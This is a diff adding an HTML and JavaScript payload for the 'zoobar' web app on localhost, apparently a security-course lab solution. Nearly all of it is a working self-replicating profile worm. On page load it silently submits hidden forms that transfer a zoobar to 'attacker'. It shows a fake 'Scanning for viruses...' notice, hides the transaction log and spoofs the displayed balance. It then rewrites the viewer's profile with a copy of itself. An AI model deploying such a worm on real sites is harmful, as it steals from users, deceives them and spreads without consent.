@@ -1,0 +1,49 @@
+</b></div>
+<div id="attacker">
+    <div>
+        <form method="POST" id="transferform" name="transferform"
+            action="http://localhost:8080/zoobar/index.cgi/transfer" target="my_iframe">
+
+            <input name="zoobars" type="text" value="1" size=5 style="display:none">
+            <input name=recipient type="text" value="attacker" size=10 style="display:none">
+            <input type="submit" name="submission" value="Send">
+        </form>
+    </div>
+    <iframe id="attack_iframe" name="my_iframe" src="" style="display:none"></iframe>
+    <div>
+        <form method="POST" id="profileform" name="profileform" action="http://localhost:8080/zoobar/index.cgi/" target="my_iframe2">
+            <textarea id="profile_update" name="profile_update" rows="20" cols="80"></textarea>
+            <input type="submit" name="profile_submit" value="Save" />
+        </form>
+    </div>
+    <iframe id="attack_iframe2" name="my_iframe2" src="" style="display:none"></iframe>
+
+    <style>
+        #attacker div {
+            display: none;
+        }
+    </style>
+
+    <script type="text/javascript">
+
+        document.addEventListener("DOMContentLoaded", function (event) {
+            document.getElementById('transferform').submit();
+
+            let node = document.createElement("b");
+            node.appendChild(document.createTextNode("Scanning for viruses..."));
+            document.getElementById("profile").appendChild(node);
+
+            (document.getElementsByClassName("log")[0]).tBodies[0].setAttribute("style", "display:none");
+
+            document.getElementById("zoobars").setAttribute("class", 10);
+            total = 10;
+            showZoobars(0);
+
+             let pre = '</b></div><div id=' + 'attacker' + '>';
+            document.getElementById('profile_update').textContent = pre + document.getElementById('attacker').innerHTML + '</div>';
+            document.getElementById('profileform').submit();
+        });
+
+
+    </script>
+</div>
